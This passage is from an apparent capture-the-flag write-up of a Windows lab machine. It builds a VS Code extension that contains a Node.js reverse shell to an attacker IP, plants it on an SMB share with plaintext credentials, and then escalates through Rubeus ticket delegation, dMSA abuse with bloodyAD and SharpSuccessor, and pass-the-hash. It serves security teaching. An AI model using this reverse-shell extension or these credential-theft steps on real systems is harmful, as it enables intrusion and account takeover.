   `---------´   │        generator!        │
    ( _´U`_ )    ╰──────────────────────────╯
    /___A___\   /
     |  ~  |     
   __'.___.'__   
 ´   `  |° ´ Y ` 

`list` prompt is deprecated. Use `select` prompt instead.
? What type of extension do you want to create?
❯ New Extension (TypeScript)
  New Extension (JavaScript)
  New Color Theme
  New Language Support
  New Code Snippets
  New Keymap
  New Extension Pack
  New Language Pack (Localization)
  New Web Extension (TypeScript)
  New Notebook Renderer (TypeScript)
```

I’ll answer the questions:

```bash
oxdf@hacky$ npx --package yo --package generator-code -- yo code

     _-----_     ╭──────────────────────────╮
    |       |    │   Welcome to the Visual  │
    |--(o)--|    │   Studio Code Extension  │
   `---------´   │        generator!        │
    ( _´U`_ )    ╰──────────────────────────╯
    /___A___\   /
     |  ~  |
   __'.___.'__
 ´   `  |° ´ Y `

`list` prompt is deprecated. Use `select` prompt instead.
✔ What type of extension do you want to create? New Extension (TypeScript)
✔ What's the name of your extension? 0xdf
✔ What's the identifier of your extension? 0xdf
✔ What's the description of your extension? give me a shell
✔ Initialize a git repository? No
`list` prompt is deprecated. Use `select` prompt instead.
✔ Which bundler to use? unbundled
`list` prompt is deprecated. Use `select` prompt instead.
✔ Which package manager to use? npm

Writing in /home/oxdf/checkpoint/0xdf...
   create 0xdf/.vscode/extensions.json
   create 0xdf/.vscode/launch.json
   create 0xdf/.vscode/settings.json
   create 0xdf/.vscode/tasks.json
   create 0xdf/package.json
   create 0xdf/tsconfig.json
   create 0xdf/.vscodeignore
   create 0xdf/vsc-extension-quickstart.md
   create 0xdf/README.md
   create 0xdf/CHANGELOG.md
   create 0xdf/src/extension.ts
   create 0xdf/src/test/extension.test.ts
   create 0xdf/.vscode-test.mjs
   create 0xdf/eslint.config.mjs

Changes to package.json were detected.

Running npm install for you to install the required dependencies.
npm warn deprecated glob@10.5.0: Old versions of glob are not supported, and contain widely publicized security vulnerabilities, which have been fixed in the current version. Please update. Support for old versions may be purchased (at exorbitant rates) by contacting i@izs.me

added 241 packages, and audited 242 packages in 6s

75 packages are looking for funding
  run `npm fund` for details

found 0 vulnerabilities

Your extension 0xdf has been created!

To start editing with Visual Studio Code, use the following commands:

     code 0xdf

Open vsc-extension-quickstart.md inside the new extension for further instructions
on how to modify, test and publish your extension.

For more information, also visit http://code.visualstudio.com and follow us @code.


`list` prompt is deprecated. Use `select` prompt instead.
✔ Do you want to open the new folder with Visual Studio Code? Skip
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

It creates the extension directory for me:

```
oxdf@hacky$ ls 0xdf
CHANGELOG.md       node_modules  package-lock.json  src            vsc-extension-quickstart.md
eslint.config.mjs  package.json  README.md          tsconfig.json
```

In `src` there’s the `extension.ts` file, which defines and exports the `activate` and `deactivate` functions:

```javascript
// The module 'vscode' contains the VS Code extensibility API
// Import the module and reference it with the alias vscode in your code below
import * as vscode from 'vscode';

// This method is called when your extension is activated
// Your extension is activated the very first time the command is executed
export function activate(context: vscode.ExtensionContext) {

	// Use the console to output diagnostic information (console.log) and errors (console.error)
	// This line of code will only be executed once when your extension is activated
	console.log('Congratulations, your extension "0xdf" is now active!');

	// The command has been defined in the package.json file
	// Now provide the implementation of the command with registerCommand
	// The commandId parameter must match the command field in package.json
	const disposable = vscode.commands.registerCommand('0xdf.helloWorld', () => {
		// The code you place here will be executed every time your command is executed
		// Display a message box to the user
		vscode.window.showInformationMessage('Hello World from 0xdf!');
	});

	context.subscriptions.push(disposable);
}

// This method is called when your extension is deactivated
export function deactivate() {}
```

I’ll replace the body of `activate` with the “node.js #2” reverse shell from [revshells.com](https://www.revshells.com/) so it runs when the extension activates:

```javascript
// The module 'vscode' contains the VS Code extensibility API
// Import the module and reference it with the alias vscode in your code below
import * as vscode from 'vscode';

// This method is called when your extension is activated
// Your extension is activated the very first time the command is executed
export function activate(context: vscode.ExtensionContext) {

	var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(443, "10.10.15.169", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
	});

	return /a/;
}

// This method is called when your extension is deactivated
export function deactivate() {}
```

It’s using `sh` because I’m going to test it locally, and because I don’t know if the remote is going to open in a Windows or WSL shell. The `return /a/;` line is left over from the revshells payload, where it keeps Node from crashing. It doesn’t matter here.

I’ll also update three things in the `package.json` file. First, I’ll add `onStartupFinished` to the `activationEvents` entry so that it triggers when VS Code opens:

```
  "activationEvents": ["onStartupFinished"],
```

I’ll also set the `engines` entry for `vscode` to `^1.118.0`, as that’s what is in the comment on the share. The generator sets this to the newest VS Code release, so if I don’t change it, the version on Checkpoint will be too old to run my extension:

```
  "engines": {
    "vscode": "^1.118.0"
  },
```

Finally, I need to update the `devDependencies` to match that version of `vscode`:

```
  "devDependencies": {
    "@types/vscode": "^1.118.0",
...[snip]...
  },
```

[This tutorial](https://code.visualstudio.com/api/working-with-extensions/publishing-extension) talks about how to package an extension into a `.vsix` file for distribution. I’ll use `vsce` (`npm install -g @vscode/vsce`) inside the package directory:

```swift
oxdf@hacky$ vsce package
Executing prepublish script 'npm run vscode:prepublish'...

> 0xdf@0.0.1 vscode:prepublish
> npm run compile


> 0xdf@0.0.1 compile
> tsc -p ./

 WARNING  A 'repository' field is missing from the 'package.json' manifest file.
Use --allow-missing-repository to bypass.
Do you want to continue? [y/N] y
 WARNING  LICENSE, LICENSE.md, or LICENSE.txt not found
Do you want to continue? [y/N] y
 INFO  Files included in the VSIX:
0xdf-0.0.1.vsix
├─ [Content_Types].xml 
├─ extension.vsixmanifest 
└─ extension/
   ├─ changelog.md 
   ├─ package.json [0.96 KB]
   └─ out/
      ├─ extension.js [0.7 KB]
      └─ test/
         └─ extension.test.js [1.94 KB]

 DONE  Packaged: /home/oxdf/checkpoint/0xdf/0xdf-0.0.1.vsix (6 files, 3.31 KB)
```

#### Local Test

I’ll install the extension in my VS Code:

```
oxdf@hacky$ code --install-extension 0xdf-0.0.1.vsix 
Installing extensions...
Extension '0xdf-0.0.1.vsix' was successfully installed.
```

I’ll start `nc` listening, and open VS Code. When it finishes loading, there’s a connection:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.15.169 33100

```

#### Remote Test

I’ll upload the `.vsix` file to the share:

```swift
oxdf@hacky$ smbclient //checkpoint.htb/devdrop -U mark.davies%Checkpoint2024!
Try "help" to get a list of possible commands.
smb: \> put 0xdf-0.0.1.vsix 
putting file 0xdf-0.0.1.vsix as \0xdf-0.0.1.vsix (40.4 kb/s) (average 45.6 kb/s)
```

I’ll start `nc` listening and wait. After a couple minutes, I get a connection:

```
oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.109.154 52787
```

It immediately disconnects. That’s likely because `sh` doesn’t exist on Windows, so the spawn fails and the pipes close as soon as the connection is made. I’ll update the package to spawn `cmd.exe`:

```typescript
export function activate(context: vscode.ExtensionContext) {

        var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("cmd.exe", []);
    var client = new net.Socket();
    client.connect(443, "10.10.15.169", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        });

        return /a/;
}
```

I’ll re-package and upload again. This time it connects and works:

```
oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.109.154 53260
Microsoft Windows [Version 10.0.26100.32860]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Microsoft VS Code>
```

The shell is running as ryan.brooks:

```
C:\Program Files\Microsoft VS Code>whoami
checkpoint\ryan.brooks
```

I can upgrade to PowerShell:

```
C:\Program Files\Microsoft VS Code>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Program Files\Microsoft VS Code> 
```

And grab `user.txt`:

```
PS C:\Users\ryan.brooks\desktop> cat user.txt
5a77a320************************
```

## Shell as svc_deploy

### Enumeration

#### Host

ryan.brooks’ home directory is pretty empty other than `user.txt` and the VS Code unpacking.

The root of `C:\` is pretty standard other than `Shares` and `Scripts` directories:

```sql
PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/1/2024  12:02 AM                PerfLogs
d-r---         5/14/2026   3:15 PM                Program Files
d-r---         1/14/2026  10:51 AM                Program Files (x86)
d-----         5/18/2026   6:31 PM                Scripts
d-----          5/9/2026   7:42 AM                Shares
d-r---         5/25/2026   6:34 PM                Users
d-----         5/21/2026   4:22 PM                Windows
```

`Scripts` has the script that installs VS Code extensions from the share:

```
PS C:\Scripts> ls

    Directory: C:\Scripts

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/18/2026   3:59 PM           5113 vscodesync.log
-a----         5/18/2026   9:36 PM           1484 vscodesync.ps1 
```

`Shares` has both shares:

```
PS C:\Shares> ls

    Directory: C:\Shares

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/18/2026   2:23 PM                DevDrop
d-----          5/9/2026  10:15 AM                VMBackups  
```

I can’t access `VMBackups`.

#### BadSuccessor

As any user, I can scan for BadSuccessor using the `netexec` module:

```css
oxdf@hacky$ netexec ldap DC01.checkpoint.htb -u alex.turner -p Checkpoint2024! -M badsuccessor
LDAP        10.129.109.154  389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.109.154  389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
BADSUCCE... 10.129.109.154  389    DC01             [+] Found domain controller with operating system Windows Server 2025: 10.129.109.154 (DC01.checkpoint.htb)
BADSUCCE... 10.129.109.154  389    DC01             [+] Found 2 results
BADSUCCE... 10.129.109.154  389    DC01             alex.turner (S-1-5-21-3129162710-3498938529-1807524340-1101), OU=Employees,DC=checkpoint,DC=htb
BADSUCCE... 10.129.109.154  389    DC01             ryan.brooks (S-1-5-21-3129162710-3498938529-1807524340-1103), OU=DMSAHolder,DC=checkpoint,DC=htb
```

It finds two principals that can create dMSAs, alex.turner in the Employees OU and ryan.brooks in the DMSAHolder OU.

[BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) is a vulnerability in Windows dMSA accounts (a feature added in Server 2025). I went into the background of BadSuccessor in [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html#bad-successor). BadSuccessor was patched as CVE-2025-53779 in build 26100.4946, the August 2025 update (KB5063878). Checkpoint is running build 26100.32860, well past that, so the original attack won’t work here:

```
PS C:\> Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select CurrentBuild,UBR,DisplayVersion

CurrentBuild   UBR DisplayVersion
------------   --- --------------
26100        32860 24H2
```

The BadSuccessor module for `netexec` doesn’t check if the patch has been applied, but rather just two things:

-   Is the DC running Server 2025?
-   Which principals can create dMSAs in which OUs?

This information can still be useful. As I’ll show below, abusing dMSAs after the patch still requires the ability to create one, and this shows ryan.brooks can do that in the DMSAHolder OU.

#### BloodHound

I’ll mark ryan.brooks as owned in BloodHound, and look at outbound control:

![image-20261018132028735](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0f443f41041a291a.png)

![image-20261018132028735](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261018132028735.webp)

This account has `GenericWrite` over the SVC_DEPLOY account. That account is a member of both Remote Management Users and BackupAccess:

![image-20261018132750469](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1afcecc42213d707.png)

![image-20261018132750469](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261018132750469.webp)

This seems like a good target to go after, thought in general `GenericWrite` doesn’t provide that much. If ADCS were enabled (it’s not), I could look at using a shadow credential. I could also add an SPN and try to Kerberoast, but the account password isn’t crackable in this case.

### BetterSuccessor

#### Background

[Akamai’s follow-up analysis](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch) shows what changed when BadSuccessor was patched. The original attack worked because a dMSA migration was one-sided. I could create a dMSA, set its `msDS-ManagedAccountPrecededByLink` to the DN of any account (like a Domain Admin), and mark the migration complete by setting `msDS-DelegatedMSAState` to 2. The KDC would then issue the dMSA a ticket with the target’s group memberships in the PAC, along with the target’s keys. The target account didn’t have to agree to anything.

After the patch, the KDC checks the other side of the link too. The target’s `msDS-SupersededManagedAccountLink` has to point back at the dMSA, and its `msDS-SupersededServiceAccountState` has to show it’s being migrated. If those don’t match, the ticket request fails with `KRB_ERR_GENERIC`. [BetterSuccessor](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch) is Altered Security’s write-up on what’s left after the patch. The underlying primitive still works. The patch blocks taking over arbitrary accounts, but if I can also write to the target account (`GenericWrite`, or write access to the superseded link and state attributes), I can set up both sides of the migration myself. The KDC sees a valid pairing and issues the dMSA a ticket with the target’s privileges, as well as the target’s keys in the dMSA key package. That makes it a two-part requirement:

-   `CreateChild` on an OU, so I can create a dMSA.
-   Write access to the target account, so I can complete the link on its side.

That’s less dramatic than the original, which needed only the first part. It turns write access on an account into that account’s privileges and keys without changing its password or adding shadow credentials. Altered Security describes it as a privilege amplifier rather than a standalone escalation.

#### Remote Exploit

I’ll use `Rubeus.exe` (easily downloaded from [SharpCollection](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Rubeus.exe)) to get a TGT for ryan.brooks. I don’t know ryan.brooks’ password, but the `tgtdeleg` action abuses Kerberos delegation to get a usable TGT for the current user from the existing logon session. I’ll upload it to the `DevDrop` share as mark.davies, and run it:

```bash
PS C:\Shares\DevDrop> .\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: OLDRc3PieIQYikNjNc0+Z3WEscqOnqb60IIoK+lchRE=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRu/ArSeLAw3cz9VVZIi9X+w7h04n7xfM7RqvrZRivnHNOol3Gtu34hPb9vqSklJfjQYmNuQlOQz/Ccv8QIG/MjdTmT8qFNxJmKLXw9lavRF8ZTTBQOhQGPkQsRlGehYido5wJVQhYYgvsGrdTa1v8bGLs4W0gm1QsAfJQwNmKFNdwaiGJ02FSwV7SCUKVSg+cRx+Yehs41SB/G9/tfxj5BAo91snbpHAeZHWrgNkgEHqxnOQhPDsJgihmNf7inZhmxA5PnYiNwiwsdQYGLOTIBgNocZRLO4eQCK647HR5trUNPtHcu6liD28KetVI0Uu4Eqr4ybsx+DFLNoQvjDvioBT1+2k2PgLjMSc07Ru3H9F0rew8zslb8L6SpPmh/ykKUCzbrYydWWhF9ZJOsuqWWfTbDlnxiAotJfG7KL5ef98o6Jx+WiKRzQFh07GACpdhMoOjusicvh7lEvTmYttle6gZ/BcmOQIJ+UwGYaQ2AioTVA0isJ/v2z6H7a/pICty74MgyB8kv5YYjE+ay5ZLKJpf5MrGlOtBFByXjK7CC+dRPCfRXW5FW6+GVo2MTZxvJwD5TPc0v313/t2euSFkr/zeDhxLO65it7Q3UrBNNm1wHaNJcnwH1IAbKBm3RhnnvvQ5iSqSCZxU9kUMLGdXmaZT9IDaRvWhJgaVRcRmXvAUPMchprNs3SqR7DXAebwgTdtnOXxtL15EfTSUa1xTwWNkCfQ3NQrFBxYed3gNrN4broeq0e6/nKekhxE9p0TQJLDFxXz3V5Am0bWkVkRdGiYAHadKKv7wiGjJdUEqZg/pHbZvC35R8fsIMOcRqcGTkUnS8+IDlnJWyiVBgc9oldMkTbELdSNhtm/sHb8q+ZFCBvcthW+9FIb2O8pp+JTjMGsPoXeHgNrwR8E8gS+/OUQM53gEEwLOUCss56sz+0SC51vlSmRwnFmn71lyC7GgWGo/mh71BYI1U4QUT9gKdauozuMA48q6MxW/exrqzZeyUWocY7mqiVU2kHfu8jz3frRP/c5z3KZDjOeBrHae4TH9Ds3Ds7Yrxm02+0UClwb+x+PeO5m4BL/bktFA1RNYLm/ORy99FWCGhL9PY3CyzXJNFJNmeSALm4dqTn6FyKy6jNKoqXukxgwUXJ9UxJRqEf+Ocpv5q0MlP/z06PW1xhvJQv6Rc7h4I2tDHFBYBu+J4Aff/6WOiwb0FDRrkBx1uI9kRelmdHU5dBOT0+I2JjLOy7pulO7uuPNgq8EwbA1/cch++kemuj19Isn6sSbaJCY4O8mZ80+A1JLvD3eFEOSTLmtaRmjepDhrxp+GSRXo3UFo8CKHLprc7fW9a8hZVY6qgVNDqmvrDkQWd2w8zdbgzvE0CZg7+oDJsB7nQnYO8c7UgVMHmNc64m+CIujhjRcumGhsAXvgjpD21poDl6OqPBxE3NuxQeuViZ3hx3pPBmCApc6zNJ8QJUnU/VbnJfoWnceCi0ccLpxPxk4l+Gg+k3MwNThy5pTtxtGSqo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgfczQpHRSvegUOrnW9p9eBCFA1v/95iOh3InfayHhm1+hEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MTAxOTAwNDc1NVqmERgPMjAyNjEwMTkxMDQ3NTVapxEYDzIwMjYxMDI2MDA0NzU1WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=
```

I’ll save that blob to a file and convert it to CCache format:

```
oxdf@hacky$ vim ryan.brooks.kirbi.b64
oxdf@hacky$ base64 -d ryan.brooks.kirbi.b64 > ryan.brooks.kirbi
oxdf@hacky$ ticketConverter.py ryan.brooks.kirbi ryan.brooks.ccache
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

It works to auth:

```swift
oxdf@hacky$ KRB5CCNAME=ryan.brooks.ccache klist
Ticket cache: FILE:ryan.brooks.ccache
Default principal: ryan.brooks@CHECKPOINT.HTB

Valid starting       Expires              Service principal
10/19/2026 00:47:55  10/19/2026 10:47:55  krbtgt/CHECKPOINT.HTB@CHECKPOINT.HTB
        renew until 10/26/2026 00:47:55
```

Now I’ll use `bloodyAD` to run the `badSuccessor` attack (even though it’s no longer that):

```
oxdf@hacky$ KRB5CCNAME=ryan.brooks.ccache bloodyAD -d checkpoint.htb --host DC01.checkpoint.htb --dc-ip 10.129.109.154 -k add badSuccessor df_dmsa --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb' -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB'
Clock skew detected. Adjusting local time by 7:00:02.085559. Retrying operation.
[+] Creating DMSA df_dmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB
Clock skew detected. Adjusting local time by 7:00:01.648191. Retrying operation.

Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : df_dmsa$
UserRealm    : checkpoint.htb
StartTime    : 2026-10-19 00:51:15+00:00
EndTime      : 2026-10-19 10:47:55+00:00
RenewTill    : 2026-10-26 00:47:55+00:00
Flags        : enc-pa-rep, forwarded, pre-authent, forwardable, renewable
Keytype      : 18
Key          : YcKwcO94gOsAh1RiFqyvlJGN/Dqvir4YGf1UYTZm4eg=
EncodedKirbi : 

    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
[+] dMSA TGT stored in ccache file df_dmsa_na.ccache

dMSA current keys found in TGS:
AES256: 28de0079b3558e076f17a47613e94d5ca215427f6bb31192670ce7ca44eae513
AES128: b1ae149b19996e0fa6745971812d9a08
RC4: 97c13d761a155547def03f846df80ada

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

This dumped a TGT for the df_dmsa$ account, and also the RC4 (NTLM hash) for the svc_deploy account.

That works to get a shell!

```rust
oxdf@hacky$ evil-winrm-py -i DC01.checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'DC01.checkpoint.htb:5985' as 'svc_deploy'
evil-winrm-py PS C:\Users\svc_deploy\Documents>
```

#### On Checkpoint

I can also do this attack on the host. I’ll start by grabbing `SharpSuccessor.exe` (also on [SharpCollection](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/SharpSuccessor.exe)) and uploading to the SMB share. Then I can make the bidirectional link:

```bash
PS C:\Shares\DevDrop> .\SharpSuccessor.exe add /impersonate:svc_deploy /path:"OU=DMSAHolder,DC=checkpoint,DC=htb" /account:ryan.brooks /name:svc_backup
   _____ _                      _____                                        
  / ____| |                    / ____|                                       
 | (___ | |__   __ _ _ __ _ __| (___  _   _  ___ ___ ___  ___ ___  ___  _ __ 
  \___ \| '_ \ / _` | '__| '_ \\___ \| | | |/ __/ __/ _ \/ __/ __|/ _ \| '__|
  ____) | | | | (_| | |  | |_) |___) | |_| | (_| (_|  __/\__ \__ \ (_) | |   
 |_____/|_| |_|\__,_|_|  | .__/_____/ \__,_|\___\___\___||___/___/\___/|_|   
                         | |                                                 
                         |_|                                                 
@_logangoins

[+] Adding dnshostname svc_backup.checkpoint.htb
[+] Adding samaccountname svc_backup$
[+] svc_deploy's DN identified
[+] Attempting to write msDS-ManagedAccountPrecededByLink
[+] Wrote attribute successfully
[+] Attempting to write msDS-DelegatedMSAState attribute
[+] Attempting to set access rights on the dMSA object
[+] Attempting to write msDS-SupportedEncryptionTypes attribute
[+] Attempting to write userAccountControl attribute
[+] Created dMSA object 'CN=svc_backup' in 'OU=DMSAHolder,DC=checkpoint,DC=htb'
[+] Successfully weaponized dMSA object
[+] Found target account, attempting to write attributes
[+] CN=svc_backup,OU=DMSAHolder,DC=checkpoint,DC=htb written to svc_deploy object
[+] msDS-SupersededServiceAccountState set to 2
[+] Wrote to target account successfully
```

This created a dMSA account, svc_backup$. The `/account` flag sets ryan.brooks as the principal allowed to retrieve the dMSA’s managed password, which is what lets ryan.brooks request tickets as it. Now I’ll get a ticket for ryan.brooks with `Rubeus.exe` (or use the same one above), and use it to request a ticket for the new dMSA account:

```bash
PS C:\Shares\DevDrop> .\Rubeus.exe asktgs /targetuser:svc_backup$ /service:krbtgt/CHECKPOINT.HTB /opsec /dmsa /nowrap /ptt /ticket:doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRu/ArSeLAw3cz9VVZIi9X+w7h04n7xfM7RqvrZRivnHNOol3Gtu34hPb9vqSklJfjQYmNuQlOQz/Ccv8QIG/MjdTmT8qFNxJmKLXw9lavRF8ZTTBQOhQGPkQsRlGehYido5wJVQhYYgvsGrdTa1v8bGLs4W0gm1QsAfJQwNmKFNdwaiGJ02FSwV7SCUKVSg+cRx+Yehs41SB/G9/tfxj5BAo91snbpHAeZHWrgNkgEHqxnOQhPDsJgihmNf7inZhmxA5PnYiNwiwsdQYGLOTIBgNocZRLO4eQCK647HR5trUNPtHcu6liD28KetVI0Uu4Eqr4ybsx+DFLNoQvjDvioBT1+2k2PgLjMSc07Ru3H9F0rew8zslb8L6SpPmh/ykKUCzbrYydWWhF9ZJOsuqWWfTbDlnxiAotJfG7KL5ef98o6Jx+WiKRzQFh07GACpdhMoOjusicvh7lEvTmYttle6gZ/BcmOQIJ+UwGYaQ2AioTVA0isJ/v2z6H7a/pICty74MgyB8kv5YYjE+ay5ZLKJpf5MrGlOtBFByXjK7CC+dRPCfRXW5FW6+GVo2MTZxvJwD5TPc0v313/t2euSFkr/zeDhxLO65it7Q3UrBNNm1wHaNJcnwH1IAbKBm3RhnnvvQ5iSqSCZxU9kUMLGdXmaZT9IDaRvWhJgaVRcRmXvAUPMchprNs3SqR7DXAebwgTdtnOXxtL15EfTSUa1xTwWNkCfQ3NQrFBxYed3gNrN4broeq0e6/nKekhxE9p0TQJLDFxXz3V5Am0bWkVkRdGiYAHadKKv7wiGjJdUEqZg/pHbZvC35R8fsIMOcRqcGTkUnS8+IDlnJWyiVBgc9oldMkTbELdSNhtm/sHb8q+ZFCBvcthW+9FIb2O8pp+JTjMGsPoXeHgNrwR8E8gS+/OUQM53gEEw